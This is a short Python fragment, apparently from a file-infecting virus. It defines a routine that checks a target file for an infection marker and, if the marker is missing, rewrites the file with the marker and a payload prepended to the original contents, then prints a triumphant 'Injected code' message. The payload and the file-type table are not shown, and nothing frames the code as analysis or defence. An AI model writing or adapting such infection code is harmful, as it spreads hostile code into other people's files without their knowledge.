...
def inject_code(full_filename, contents, extension):
    """
    Check for marker. If not found, prepend marker + payload to original contents.
    """
    if FILE_TYPES[extension][0].strip() in contents:
        # Marker found – already injected
        return

    full_contents = FILE_TYPES[extension][0]  # marker
    full_contents += FILE_TYPES[extension][1]  # payload
    full_contents += contents  # original contents

    with open(full_filename, 'w') as f:
        f.write(full_contents)

    print('\\o/ Injected code into', full_filename)
